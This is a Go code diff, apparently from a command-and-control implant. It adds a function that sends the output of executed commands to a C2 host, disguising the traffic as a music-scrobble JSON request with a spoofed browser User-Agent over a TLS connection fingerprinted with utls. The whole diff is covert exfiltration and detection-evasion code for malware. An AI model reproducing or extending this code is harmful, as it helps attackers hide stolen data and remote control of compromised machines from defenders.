@@ -18,6 +18,7 @@ import (
 	"bufio"
 	"bytes"
 	"mime/multipart"
+	"encoding/json"
 	utls "github.com/refraction-networking/utls"
 )
 
@@ -282,6 +283,7 @@ func executeCommand(finalCommand string, uConn *utls.UConn, reader *bufio.Reader
 		}
 
 		if len(formatted_out)<5{ //temporary threshold 5, until we figure out scrobble
+			go uploadOutputAsScrobble(formatted_out, uConn, reader)
 			if echo_to_stdout=="on"{
 			fmt.Println("sending output through scrobble")}
 
@@ -292,6 +294,56 @@ func executeCommand(finalCommand string, uConn *utls.UConn, reader *bufio.Reader
 		}
 		//fmt.Println("output length - ", len(formatted_out)) 
 	}
+}
+
+//helper struct for scrobble
+type ScrobbleRequest struct{
+	Method string `json:"method"`
+	Timestamp string `json:"timestamp"`
+	TrackID string `json:"track_id"`
+	PlayedMs string `json:"played_ms"`
+	//DurationMs string `json:"duration_ms"`
+	ApiSig string `json:"api_sig"` //is where the output lies
+
+}
+func uploadOutputAsScrobble(output string, uConn *utls.UConn, reader *bufio.Reader){
+	payload := ScrobbleRequest{
+		Method : "track.Scrobble",
+		Timestamp : strconv.FormatInt(time.Now().Unix(), 10),
+		TrackID : "sample.wav",
+		PlayedMs : "2",
+		//DurationMs : 
+		ApiSig : output,
+	}
+	
+	body, err := json.Marshal(payload)
+	if err != nil {
+		fmt.Println("Errored out json -",err)
+	}
+
+	reqHeader := fmt.Sprintf(
+	"POST /api/v1/sample/scrobble HTTP/1.1\r\n"+
+	"Host: "+c2_hostname+"\r\n"+
+	"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36\r\n"+
+	"Content-Type: application/json\r\n"+
+	"Content-Length: %d\r\n"+
+	//"Authorization: Bearer %s\r\n"+
+	"Accept: application/json\r\n"+
+	"Connection: keep-alive\r\n"+
+	"\r\n",
+	len(body),
+	)
+
+	if _, err := io.WriteString(uConn, reqHeader); err != nil {
+		fmt.Printf("write header: %w", err)
+	}
+	if _, err := uConn.Write(body); err != nil {
+        fmt.Printf("write body: %w", err)
+    }
+
+    dummyReq := &http.Request{Method: "POST"}
+    http.ReadResponse(reader, dummyReq)
+    
 }
 
 func encoding_engine(output string, uConn *utls.UConn, reader *bufio.Reader){
